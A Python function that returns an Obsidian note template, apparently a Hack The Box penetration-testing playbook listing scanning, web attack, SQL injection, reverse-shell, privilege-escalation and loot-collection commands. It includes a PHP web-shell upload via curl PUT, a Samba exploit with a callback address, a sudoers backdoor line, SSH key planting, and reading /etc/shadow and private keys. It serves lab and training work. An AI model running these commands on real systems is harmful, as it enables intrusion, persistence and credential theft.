
def get_playbook_template():
    return '''
You can auto update your target details in each note with the button below
```button
name Update Machine Playbooks
type link
action obsidian://shell-commands/?vault=HTB&execute=28lv9wrf7u
templater true
color green
```
- This will run a script to change all INSERTIPADDRESS values to an actual target IP
- This will run a script to change all INSERTHOSTNAME values to an actual hostname
- This is useful for copy/paste of commands into console

## Target Info-sheet


- DNS-Domain name:
- Host name: INSERTHOSTNAME
- OS:
- Server:
- Kernel:
- Workgroup:
- Windows domain:

Prep your attack Surface
```
msfdb run
loadpath /TOOL/Metasploit-Code/modules
workspace "HTB-Labs"
```
Manually Prep your templates
Quick Edit sed -i 's/old-text/new-text/g' filename.txt

```
ex: sed -i 's/INSERTIPADDRESS/10.10.10.145/g' 10.10.10.145.md
ex: sed -i 's/INSERTHOSTNAME/server.localhost/g' 10.10.10.145.md
```

Upload a File to the Web Server.
```
curl -F ‘data=@path/to/local/file’ UPLOAD_ADDRESS
```
## Recon

## Using Legion to Scan All the Things
```
legion
    set workdir /Shared/PyCharms/HTB-Labs/Machines
    set extensions txt,pdf,php,doc,docx,cgi,sh,pl,py,html,htm,phtml
    set host INSERTIPADDRESS
    set domain INSERTHOSTNAME
    run
```

#### Syn-scan
Always start with a stealthy scan to avoid closing ports.
```
db_nmap -sS INSERTIPADDRESS
```
#### Scan all ports, might take a while.
```
db_nmap INSERTIPADDRESS -p-
```
#### Service-version, default scripts, OS:
```
db_nmap INSERTIPADDRESS -sV -sC -O -p 111,222,333
```

#### Scan for UDP
```
db_nmap INSERTIPADDRESS -sU
unicornscan -mU -v -I INSERTIPADDRESS
```

#### Connect to udp if one is open
```
nc -u INSERTIPADDRESS 48772
```
#### Monster scan
```
db_nmap INSERTIPADDRESS -p- -A -T4 -sC
```
#### Sneaky Monster Scans
```
db_nmap -sV -sC -Pn -p 1-65535 -T5 --min-rate 1000 --max-retries 5 INSERTIPADDRESS
db_nmap -sU -T4 -p1-1000 -sC -sV INSERTIPADDRESS
masscan -e tun0 -p1-65535,U:1-65535 INSERTIPADDRESS --rate=100
python /TOOL/nosey_neighbour/nosey.py INSERTIPADDRESS
autorecon -o /home/kali/Documents/HTNotes/HTB/Machines/INSERTHOSTNAME/assets/ INSERTIPADDRESS
masscan -e tun0 -p1-65535,U:1-65535 --max-rate=500 INSERTIPADDRESS 
/TOOL/Target-Enumeration/sma.sh
nmap -Pn -n --script vuln INSERTIPADDRESS
```

### Brute Force All the Things!
```
cd /TOOL/BruteX
brutex INSERTIPADDRESS
```

### Port 21 - FTP

- FTP-Name:
- FTP-version:
- Anonymous login:

INSERTFTPTEST

```
db_nmap --script=ftp-anon,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 INSERTIPADDRESS
```

### Port 22 - SSH

- Name:
- Version:
- Takes-password:
- If you have usernames test login with username:username

- INSERTSSHCONNECT

```
nc INSERTIPADDRESS 22
ssh INSERTIPADDRESS
ssh -oKexAlgorithms=+diffie-hellman-group-sha1 -c aes128-cbc INSERTIPADDRESS
```

### Port 25

- Name:
- Version:
- VRFY:

INSERTSMTPCONNECT


```
nc -nvv INSERTIPADDRESS 25
HELO foo<cr><lf>

telnet INSERTIPADDRESS 25
VRFY root

db_nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 INSERTIPADDRESS
```

### Port 53

- Name:
- Version:

```
dig axfr domain.name @INSERTIPADDRESS
dig @INSERTIPADDRESS -x INSERTIPADDRESS
```

### Port 69 - UDP - TFTP

This is used for tftp-server.


### Port 110 - Pop3

- Name:
- Version:

INSERTPOP3CONNECT

```
telnet INSERTIPADDRESS 110
USER pelle@INSERTIPADDRESS
PASS admin

or:

USER pelle
PASS admin

# List all emails
list

# Retrieve email number 5, for example
retr 9
```

### Port 111 - Rpcbind

```
rpcinfo -p INSERTIPADDRESS
```


### Port 135 - MSRPC

Some versions are vulnerable.

### Port 143/993 - Imap

INSERTIMAPCONNECT

```
nc -nvv INSERTIPADDRESS 143
openssl s_client -connect INSERTIPADDRESS:993

CONNECT (SSL/PLAIN)
LOGIN
CRAM-MD5 LOGIN
CAPABILITY
LIST
STATUS
SELECT
SEARCH
FETCH
SET
EXPUNGE
FLAGS
RANGE
UID

Command Input :
 <RandomStringID> command
Answer :
 <RandomStringID> OK <ANSWER DETAIL>

Examples :
   x1yz login test@dom.it p4ssw0rd
   x1yz OK login successful
or
   a login test@dom.it p4ssw0rd
   a OK login successful
https://busylog.net/telnet-imap-commands-note/
```

### Port 139/445 - SMB

- Name: INSERTHOSTNAME
- Version:
- Domain/workgroup name:
- Domain-sid:
- Allows unauthenticated login:


```
db_nmap --script=smb-enum-shares.nse,smb-ls.nse,smb-enum-users.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-security-mode.nse,smbv2-enabled.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse,smbv2-enabled.nse INSERTIPADDRESS -p 445

nmap --script=smb-* INSERTIPADDRESS -p 445


enum4linux -a INSERTIPADDRESS

rpcclient -U "" INSERTIPADDRESS
	srvinfo
	enumdomusers
	getdompwinfo
	querydominfo
	netshareenum
	netshareenumall

smbclient -L INSERTIPADDRESS
smbclient //INSERTIPADDRESS/tmp
smbclient \\\\INSERTIPADDRESS\\ipc$ -U john
smbclient //INSERTIPADDRESS/ipc$ -U john
smbclient //INSERTIPADDRESS/admin$ -U john
smbmount "\\\\INSERTIPADDRESS\\Share" -U "" -c 'mount /tmp/001 -u 500 -g 100'

Create a tar file of all the files and directories in the share.
smbclient //mypc/myshare "" -N -Tc backup.tar * 

smb: \> recurse on
smb: \> ls


Log in with shell:
winexe -U username //INSERTIPADDRESS "cmd.exe" --system
```
- Samba < 3.0.20 Exploit:	https://github.com/amriunix/CVE-2007-2447
```
python usermap_script.py INSERTIPADDRESS 445 10.10.14.13 4444
```

### Port 161/162 UDP - SNMP

```
db_nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes INSERTIPADDRESS
snmp-check -t INSERTIPADDRESS -c public
snmpwalk -v2 c -c publie INSERTIPADDRESS
```

```
# Common community strings
public
private
community
```

### Port 500 UDP - ISAKMP

```
nmap  -sC -sV -p500 -sU INSERTIPADDRESS

apt install ike-scan
ike-scan INSERTIPADDRESS
```

### Port 554 - RTSP


### Port 1030/1032/1033/1038

Used by RPC to connect in domain network.

## Port 1521 - Oracle

- Name:
- Version:
- Password protected:

```
tnscmd10g version -h INSERTIPADDRESS
tnscmd10g status -h INSERTIPADDRESS
```

### Port 2049 - NFS

```
showmount -e INSERTIPADDRESS

If you find anything you can mount it like this:

mount INSERTIPADDRESS:/ /tmp/NFS
mount -t INSERTIPADDRESS:/ /tmp/NFS
```

### Port 2100 - Oracle XML DB

- Name:
- Version:
- Default logins:

```
sys:sys
scott:tiger
```

Default passwords
https://docs.oracle.com/cd/B10501_01/win.920/a95490/username.htm


### 3306 - MySQL

- Name:
- Version:

```
db_nmap --script=mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse INSERTIPADDRESS -p 3306

mysql --host=INSERTIPADDRESS -u root -p
```

### Port 3339 - Oracle web interface


- Basic info about web service (apache, nginx, IIS)
- Server:
- Scripting language:
- Apache Modules:
- IP-address:

### Port 80 - Web server

- Server:
- Scripting language:
- Apache Modules:
- IP-address:
- Domain-name address:


INSERTCURLHEADER

- Web application (ex, wordpress, joomla, phpmyadmin)
- Name:
- Version:
- Admin-login:

ALWAYS VIEW THE SOURCES!!!

#### Scan all the Web Things!

```
#dir_buster
dirbuster -u http://INSERTHOSTNAME -l /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e txt,pdf,php,doc,docx,cgi,sh,pl,py,html,htm,phtml

#gobuster
gobuster  dir -u http://INSERTHOSTNAME/ 404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --wildcard
gobuster  dir -u http://INSERTHOSTNAME/ 404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -x txt,pdf,php,doc,docx,cgi,sh,pl,py,html,htm,phtml  --wildcard

#OptionsBleed
cd /TOOL/OptionsBleed-POC-Scanner && python bleeder.py "http://HOSTNAME" -c 50

#htexploit
cd /TOOL/htexploit && ./htexploit -u example.com

#waes
cd /TOOL/WAES && sudo ./waes.sh -u example.com

#wapiti
wapiti -u http://INSERTHOSTNAME/

#wpscan
wpscan --url http://INSERTHOSTNAME/wp/

# Nikto
nikto -h http://INSERTIPADDRESS
nikto -h http://INSERTHOSTNAME

# Nikto with squid proxy
nikto -h INSERTIPADDRESS -useproxy http://INSERTIPADDRESS:4444

# CMS Explorer
cms-explorer -url http://INSERTIPADDRESS -type [Drupal, WordPress, Joomla, Mambo]

# WPScan (vp = Vulnerable Plugins, vt = Vulnerable Themes, u = Users)
wpscan --url http://INSERTIPADDRESS
wpscan --url http://INSERTIPADDRESS --enumerate vp
wpscan --url http://INSERTIPADDRESS --enumerate vt
wpscan --url http://INSERTIPADDRESS --enumerate u

# Joomscan
joomscan -u  http://INSERTIPADDRESS 
joomscan -u  http://INSERTIPADDRESS --enumerate-components

# Get header
curl -i INSERTIPADDRESS

# Get everything
curl -i -L INSERTIPADDRESS

# Check for title and all links
curl INSERTIPADDRESS -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//'

# Look at page with just text
curl INSERTIPADDRESS -s -L | html2text -width '99' | uniq

# Check if it is possible to upload
curl -v -X OPTIONS http://INSERTIPADDRESS/
curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://INSERTIPADDRESS/test/shell.php

dotdotpwn.pl -m http -h INSERTIPADDRESS -M GET -o unix
```
#### Nikto scan

INSERTNIKTOSCAN

#### Url brute force

- Not a recursive scan
```
dirb http://INSERTIPADDRESS -r -o dirb-INSERTIPADDRESS.txt
```

#### Gobuster - remove relevant responde codes (403 for example)
```
gobuster -u http://INSERTIPADDRESS -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e
```
INSERTDIRBSCAN


#### Default/Weak login
- Search documentation for default passwords and test them

```
site:webapplication.com password
```

```
admin admin
admin password
admin <blank>
admin <servicename>
root root
root admin
root password
root <servicename>
<username if you have> password
<username if you have> admin
<username if you have> username
username <servicename>
```

#### LFI/RFI

```
fimap -u "http://INSERTIPADDRESS/example.php?test="
```
- Ordered output
```
curl -s http://INSERTIPADDRESS/gallery.php?page=/etc/passwd
/root/Tools/Kadimus/kadimus -u http://INSERTIPADDRESS/example.php?page=
```

#### SQL-Injection

##### Post
```
./sqlmap.py -r search-test.txt -p tfUPass
```
###### Get
```
sqlmap -u "http://INSERTIPADDRESS/index.php?id=1" --dbms=mysql
```
##### Crawl
```
sqlmap -u http://INSERTIPADDRESS --dbms=mysql --crawl=3
```
##### Sql-login-bypass

- Open Burp-suite
- Make and intercept a request
- Send to intruder
- Cluster attack.
- Paste in sqlibypass-list (https://bobloblaw.gitbooks.io/security/content/sql-injections.html)
- Attack
- Check for response length variation

### Password brute force - last resort

```
cewl
```

### Port 443 - HTTPS

- Heartbleed:
```
sslscan INSERTIPADDRESS:443
```

### Vulnerability analysis

Now we have gathered information about the system. Now comes the part where we look for exploits and vulnerabilities and features.

#### To try - List of possibles
Add possible exploits here:



#### Find sploits - Searchsploit and google
Where there are many exploits for a software, use google. It will automatically sort it by popularity.

```
site:exploit-db.com apache 2.4.7
```

- Remove any dos based exploits
```
searchsploit Apache 2.4.7 | grep -v '/dos/'
searchsploit Apache | grep -v '/dos/' | grep -vi "tomcat"
```

- Only search the title (exclude the path), add the -t
```
searchsploit -t Apache | grep -v '/dos/'
```
---
# Payloads
#### Bind shells
```
python3 shellerator.py --bind-shell --port 1337 
```
#### Reverse shell
If you want to generate reverse shells (choice by default), you'll need to supply the listener IP address and port.
```
python3 shellerator.py -i/--ip 192.168.56.1 -p/--port 1337
python3 shellerator.py -r/--reverse-shell -i/--ip 192.168.56.1 -p/--port 1337
```
- Without a CLI menu
If you already know what type of shell you want to generate and don't have time to select the language in the beautiful CLI menu, you can set it with the appropriate -t (or --type) option.
```
python3 shellerator.py [-r | -b] -t/--type bash -i/--ip 192.168.56.1 -p/--port 1337
```
- Using PwnDrop
```
pwndrop start
```

---
# PRIVESC
---
#### Privilege escalation

![Player Info Card](method.png)

Now we start the whole enumeration-process over gain.

##### To-try list

Here you will add all possible leads. What to try.

- Kernel exploits
- Programs running as root
- Installed software
- Weak/reused/plaintext passwords
- Inside service
- Suid misconfiguration
- World writable scripts invoked by root
- Unmounted filesystems

Less likely

- Private ssh keys
- Bad path configuration
- Cronjobs

---

#### Simple Python Shell
```
python -c 'import pty; pty.spawn("/bin/bash")'
```
### PrivEsc Script Automation with HTBEnum
https://github.com/SolomonSklash/htbenum/

- On Server
```
cd /TOOL/htbenum/
./htbenum.sh -i 10.10.14.7 -p 6969 -w -o /TARGET/
```
- On Target
```
wget http://10.10.14.7:6969/htbenum.sh
bash ./htbenum.sh -i 10.10.14.7 -p 6969 -r
```

#### Checklist
https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist

#### Check for quick wins @
https://gtfobins.github.io/

#### MSF Scan
```
use post/multi/recon/local_exploit_suggester
```
#### BAShark Enum
```
wget https://raw.githubusercontent.com/wintrmvte/Bashark/master/bashark.sh
source bashark.sh
```

### To-try list

Here you will add all possible leads. What to try.


### Useful commands

# Spawning shell
```
python -c 'import pty; pty.spawn("/bin/sh")'
```
# Access to more binaries
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

# Set up webserver
```
cd /root/oscp/useful-tools/privesc/linux/privesc-scripts; python -m SimpleHTTPServer 8080
```
# Download all files
```
wget http://192.168.1.101:8080/ -r; mv 192.168.1.101:8080 exploits; cd exploits; rm index.html; chmod 700 LinEnum.sh linprivchecker.py unix-privesc-check

./LinEnum.sh -t -k password -r LinEnum.txt
python linprivchecker.py extended
./unix-privesc-check standard
```

# Writable directories
```
/tmp
/var/tmp
```

# Add user to sudoers
```
echo "hacker ALL=(ALL:ALL) ALL" >> /etc/sudoers
```
### Quick SSH Key Copy
```
mkdir -p ~/.ssh;
chmod 700 ~/.ssh;
echo "<PASTE PUBLIC KEY HERE>" >> ~/.ssh/authorized_keys;
chmod 600 ~/.ssh/authorized_keys;
```


### Basic info

- OS:
- Version:
- Kernel version:
- Architecture:
- Current user:

**Devtools:**
- GCC:
- NC:
- WGET:

**Users with login:**

```
uname -a
env
id
cat /proc/version
cat /etc/issue
cat /etc/passwd
cat /etc/group
cat /etc/shadow
cat /etc/hosts
```
##### Users with login
```
grep -vE "nologin" /etc/passwd
```

##### Priv Enumeration Scripts
```
upload /unix-privesc-check
upload /root/Desktop/Backup/Tools/Linux_privesc_tools/linuxprivchecker.py ./
upload /root/Desktop/Backup/Tools/Linux_privesc_tools/LinEnum.sh ./
run pspy

python linprivchecker.py extended
./LinEnum.sh -t -k password
unix-privesc-check
```

### Kernel exploits

```
site:exploit-db.com kernel version

perl /root/oscp/useful-tools/privesc/linux/Linux_Exploit_Suggester/Linux_Exploit_Suggester.pl -k 2.6

python linprivchecker.py extended
```

### Programs running as root

Look for webserver, mysql or anything else like that.

```
# Metasploit
ps

# Linux
ps aux
```

### Installed software

```
/usr/local/
/usr/local/src
/usr/local/bin
/opt/
/home
/var/
/usr/src/

# Debian
dpkg -l

# CentOS, OpenSuse, Fedora, RHEL
rpm -qa (CentOS / openSUSE )

# OpenBSD, FreeBSD
pkg_info
```


### Weak/reused/plaintext passwords

- Check database config-file
- Check databases
- Check weak passwords

```
username:username
username:username1
username:root
username:admin
username:qwerty
username:password
```

- Check plaintext

```
./LinEnum.sh -t -k password
```

### Inside service

```
# Linux
netstat -anlp
netstat -ano
```

### Suid misconfiguration

Binary with suid permission can be run by anyone, but when they are run they are run as root!

Example programs:

```
db_nmap
vim
nano
```

```
find / -perm -u=s -type f 2>/dev/null
```


### Unmounted filesystems

Here we are looking for any unmounted filesystems. If we find one we mount it and start the priv-esc process over again.

```
mount -l
```

### Cronjob

Look for anything that is owned by privileged user but writable for you

```
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
```

### SSH Keys

Check all home directories

```
cat ~/.ssh/authorized_keys
cat ~/.ssh/identity.pub
cat ~/.ssh/identity
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa.pub
cat ~/.ssh/id_dsa
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_host_dsa_key.pub
cat /etc/ssh/ssh_host_dsa_key
cat /etc/ssh/ssh_host_rsa_key.pub
cat /etc/ssh/ssh_host_rsa_key
cat /etc/ssh/ssh_host_key.pub
cat /etc/ssh/ssh_host_key
```


### Bad path configuration

Require user interaction





---
# LOOT
---

**Checklist**

- Proof:
- Network secret:
- Passwords and hashes:
- Dualhomed:
- Tcpdump:
- Interesting files:
- Databases:
- SSH-keys:
- Browser:
- Mail:


### Proof

```
/root/proof.txt
```

### Network secret

```
/root/network-secret.txt
```

### Passwords and hashes

```
cat /etc/passwd
cat /etc/shadow

unshadow passwd shadow > unshadowed.txt
john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
```

### Dualhomed

```
ifconfig
ifconfig -a
arp -a
```

### Tcpdump

```
tcpdump -i any -s0 -w capture.pcap
tcpdump -i eth0 -w capture -n -U -s 0 src not 192.168.1.X and dst not 192.168.1.X
tcpdump -vv -i eth0 src not 192.168.1.X and dst not 192.168.1.X
```

### Interesting files

```
#Meterpreter
search -f *.txt
search -f *.zip
search -f *.doc
search -f *.xls
search -f config*
search -f *.rar
search -f *.docx
search -f *.sql

.ssh:
.bash_history
```

### Databases

### SSH-Keys

### Browser

### Mail

```
/var/mail
/var/spool/mail
```

### GUI
If there is a gui we want to check out the browser.

```
echo $DESKTOP_SESSION
echo $XDG_CURRENT_DESKTOP
echo $GDMSESSION
```

```button
name Update the Playbook for this Machine
type link
action obsidian://shell-commands/?vault=HTB&execute=g7sm2q030y
templater true
```

'''
